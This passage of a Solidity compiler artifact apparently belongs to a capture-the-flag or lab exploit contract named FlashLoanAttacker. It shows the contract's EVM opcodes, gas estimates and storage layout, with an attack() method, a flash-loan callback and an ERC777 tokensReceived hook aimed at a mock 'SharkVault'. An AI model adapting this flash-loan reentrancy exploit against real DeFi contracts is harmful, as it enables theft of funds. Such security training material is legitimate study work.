EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP8 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x63C SWAP3 SWAP2 SWAP1 PUSH2 0xDDF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x65B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x67F SWAP2 SWAP1 PUSH2 0xE40 JUMP JUMPDEST PUSH2 0x688 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x439148F0BBC682CA079E46D6E2C2F0C1E3B820F1A291B069D8882ABF8CF18DD9 SWAP1 POP SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x4 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x29965A1D PUSH1 0x0 PUSH32 0xB281FC8C12954D22544DB45DE3159A39272895B169A852B314F9CC762E44C53B ADDRESS PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x735 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF26 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x74F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x763 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x613255AB PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x7E4 SWAP2 SWAP1 PUSH2 0xBBE JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x801 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x825 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP1 POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x5CFFE9DE ADDRESS PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x89A SWAP2 SWAP1 PUSH2 0xF9B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x8C8 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x109B JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8E7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x90B SWAP2 SWAP1 PUSH2 0xE40 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x944 DUP3 PUSH2 0x919 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x954 DUP2 PUSH2 0x939 JUMP JUMPDEST DUP2 EQ PUSH2 0x95F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x971 DUP2 PUSH2 0x94B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x98A DUP2 PUSH2 0x977 JUMP JUMPDEST DUP2 EQ PUSH2 0x995 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x9A7 DUP2 PUSH2 0x981 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP4 PUSH1 0x1F DUP5 ADD SLT PUSH2 0x9D2 JUMPI PUSH2 0x9D1 PUSH2 0x9AD JUMP JUMPDEST JUMPDEST DUP3 CALLDATALOAD SWAP1 POP PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x9EF JUMPI PUSH2 0x9EE PUSH2 0x9B2 JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP4 ADD SWAP2 POP DUP4 PUSH1 0x1 DUP3 MUL DUP4 ADD GT ISZERO PUSH2 0xA0B JUMPI PUSH2 0xA0A PUSH2 0x9B7 JUMP JUMPDEST JUMPDEST SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0xC0 DUP10 DUP12 SUB SLT ISZERO PUSH2 0xA32 JUMPI PUSH2 0xA31 PUSH2 0x90F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xA40 DUP12 DUP3 DUP13 ADD PUSH2 0x962 JUMP JUMPDEST SWAP9 POP POP PUSH1 0x20 PUSH2 0xA51 DUP12 DUP3 DUP13 ADD PUSH2 0x962 JUMP JUMPDEST SWAP8 POP POP PUSH1 0x40 PUSH2 0xA62 DUP12 DUP3 DUP13 ADD PUSH2 0x962 JUMP JUMPDEST SWAP7 POP POP PUSH1 0x60 PUSH2 0xA73 DUP12 DUP3 DUP13 ADD PUSH2 0x998 JUMP JUMPDEST SWAP6 POP POP PUSH1 0x80 DUP10 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xA94 JUMPI PUSH2 0xA93 PUSH2 0x914 JUMP JUMPDEST JUMPDEST PUSH2 0xAA0 DUP12 DUP3 DUP13 ADD PUSH2 0x9BC JUMP JUMPDEST SWAP5 POP SWAP5 POP POP PUSH1 0xA0 DUP10 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xAC3 JUMPI PUSH2 0xAC2 PUSH2 0x914 JUMP JUMPDEST JUMPDEST PUSH2 0xACF DUP12 DUP3 DUP13 ADD PUSH2 0x9BC JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 SWAP6 SWAP9 POP SWAP3 SWAP6 SWAP9 SWAP1 SWAP4 SWAP7 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0xA0 DUP8 DUP10 SUB SLT ISZERO PUSH2 0xAFE JUMPI PUSH2 0xAFD PUSH2 0x90F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xB0C DUP10 DUP3 DUP11 ADD PUSH2 0x962 JUMP JUMPDEST SWAP7 POP POP PUSH1 0x20 PUSH2 0xB1D DUP10 DUP3 DUP11 ADD PUSH2 0x962 JUMP JUMPDEST SWAP6 POP POP PUSH1 0x40 PUSH2 0xB2E DUP10 DUP3 DUP11 ADD PUSH2 0x998 JUMP JUMPDEST SWAP5 POP POP PUSH1 0x60 PUSH2 0xB3F DUP10 DUP3 DUP11 ADD PUSH2 0x998 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x80 DUP8 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xB60 JUMPI PUSH2 0xB5F PUSH2 0x914 JUMP JUMPDEST JUMPDEST PUSH2 0xB6C DUP10 DUP3 DUP11 ADD PUSH2 0x9BC JUMP JUMPDEST SWAP3 POP SWAP3 POP POP SWAP3 SWAP6 POP SWAP3 SWAP6 POP SWAP3 SWAP6 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8E DUP2 PUSH2 0xB7B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xBA9 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xB85 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xBB8 DUP2 PUSH2 0x939 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xBD3 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xBAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xBE8 DUP2 PUSH2 0x981 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xC04 JUMPI PUSH2 0xC03 PUSH2 0x90F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xC12 DUP5 DUP3 DUP6 ADD PUSH2 0xBD9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC4A PUSH2 0xC45 PUSH2 0xC40 DUP5 PUSH2 0xC1B JUMP JUMPDEST PUSH2 0xC25 JUMP JUMPDEST PUSH2 0x977 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC5A DUP2 PUSH2 0xC2F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xC75 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xC51 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x57726F6E6720696E69746961746F720000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCC2 PUSH1 0xF DUP4 PUSH2 0xC7B JUMP JUMPDEST SWAP2 POP PUSH2 0xCCD DUP3 PUSH2 0xC8C JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xCF1 DUP2 PUSH2 0xCB5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E6F7420676F6C64000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD2E PUSH1 0x8 DUP4 PUSH2 0xC7B JUMP JUMPDEST SWAP2 POP PUSH2 0xD39 DUP3 PUSH2 0xCF8 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xD5D DUP2 PUSH2 0xD21 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x466565206D757374206265203000000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD9A PUSH1 0xD DUP4 PUSH2 0xC7B JUMP JUMPDEST SWAP2 POP PUSH2 0xDA5 DUP3 PUSH2 0xD64 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xDC9 DUP2 PUSH2 0xD8D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xDD9 DUP2 PUSH2 0x977 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0xDF4 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0xBAF JUMP JUMPDEST PUSH2 0xE01 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0xDD0 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xE1D DUP2 PUSH2 0xE08 JUMP JUMPDEST DUP2 EQ PUSH2 0xE28 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xE3A DUP2 PUSH2 0xE14 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE56 JUMPI PUSH2 0xE55 PUSH2 0x90F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xE64 DUP5 DUP3 DUP6 ADD PUSH2 0xE2B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xE82 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xDD0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xEAD PUSH2 0xEA8 PUSH2 0xEA3 DUP5 PUSH2 0xE88 JUMP JUMPDEST PUSH2 0xC25 JUMP JUMPDEST PUSH2 0x977 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xEBD DUP2 PUSH2 0xE92 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xED8 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xEB4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF10 PUSH2 0xF0B PUSH2 0xF06 DUP5 PUSH2 0xEDE JUMP JUMPDEST PUSH2 0xEE8 JUMP JUMPDEST PUSH2 0xB7B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF20 DUP2 PUSH2 0xEF5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0xF3B PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0xBAF JUMP JUMPDEST PUSH2 0xF48 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0xF17 JUMP JUMPDEST PUSH2 0xF55 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0xBAF JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF85 PUSH2 0xF80 PUSH2 0xF7B DUP5 PUSH2 0xE88 JUMP JUMPDEST PUSH2 0xC25 JUMP JUMPDEST PUSH2 0xF5D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xF95 DUP2 PUSH2 0xF6A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xFB0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xF8C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xFD1 PUSH2 0xFCC PUSH2 0xFC7 DUP5 PUSH2 0x919 JUMP JUMPDEST PUSH2 0xC25 JUMP JUMPDEST PUSH2 0x919 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xFE3 DUP3 PUSH2 0xFB6 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xFF5 DUP3 PUSH2 0xFD8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1005 DUP2 PUSH2 0xFEA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1045 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x102A JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x106D DUP3 PUSH2 0x100B JUMP JUMPDEST PUSH2 0x1077 DUP2 DUP6 PUSH2 0x1016 JUMP JUMPDEST SWAP4 POP PUSH2 0x1087 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x1027 JUMP JUMPDEST PUSH2 0x1090 DUP2 PUSH2 0x1051 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x80 DUP3 ADD SWAP1 POP PUSH2 0x10B0 PUSH1 0x0 DUP4 ADD DUP8 PUSH2 0xFFC JUMP JUMPDEST PUSH2 0x10BD PUSH1 0x20 DUP4 ADD DUP7 PUSH2 0xBAF JUMP JUMPDEST PUSH2 0x10CA PUSH1 0x40 DUP4 ADD DUP6 PUSH2 0xDD0 JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x60 DUP4 ADD MSTORE PUSH2 0x10DC DUP2 DUP5 PUSH2 0x1062 JUMP JUMPDEST SWAP1 POP SWAP6 SWAP5 POP POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4D BASEFEE PUSH7 0xC73E0EEAE3757B SWAP12 0x4B 0xE 0xB8 LOG2 SDIV DUP9 0x25 JUMP 0xC PUSH30 0xC4D890C3D7F5B7DEE6AD9864736F6C634300081300330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "876200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"onFlashLoan(address,address,uint256,uint256,bytes)": "infinite",
						"tokensReceived(address,address,address,uint256,bytes,bytes)": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"onFlashLoan(address,address,uint256,uint256,bytes)": "23e30c8b",
					"tokensReceived(address,address,address,uint256,bytes,bytes)": "0023de29"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 213,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol:FlashLoan",
						"label": "gold",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IERC20)68"
					},
					{
						"astId": 216,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol:FlashLoan",
						"label": "seagold",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(IERC20)68"
					},
					{
						"astId": 219,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol:FlashLoan",
						"label": "flashLender",
						"offset": 0,
						"slot": "2",
						"type": "t_contract(IERC3156FlashLender)190"
					},
					{
						"astId": 222,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol:FlashLoan",
						"label": "vault",
						"offset": 0,
						"slot": "3",
						"type": "t_contract(SharkVault)143"
					},
					{
						"astId": 224,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol:FlashLoan",
						"label": "pwned",
						"offset": 20,
						"slot": "3",
						"type": "t_bool"
					},
					{
						"astId": 227,
						"contract": "Node-Guardian_Cream_Rkt/Src/Contracts/FlashLoanAttacker.sol:FlashLoan",
						"label": "registry",
						"offset": 0,
						"slot": "4",
						"type": "t_contract(ERC1820Registry)87"
					}
				],
				"types": {
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(ERC1820Registry)87": {
						"encoding": "inplace",
						"label": "contract ERC1820Registry",
						"numberOfBytes": "20"
					},
					"t_contract(IERC20)68": {
						"encoding": "inplace",
						"label": "contract IERC20",
						"numberOfBytes": "20"
					},
					"t_contract(IERC3156FlashLender)190": {
						"encoding": "inplace",
						"label": "contract IERC3156FlashLender",
						"numberOfBytes": "20"
					},
					"t_contract(SharkVault)143": {
						"encoding": "inplace",
						"label": "contract SharkVault",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}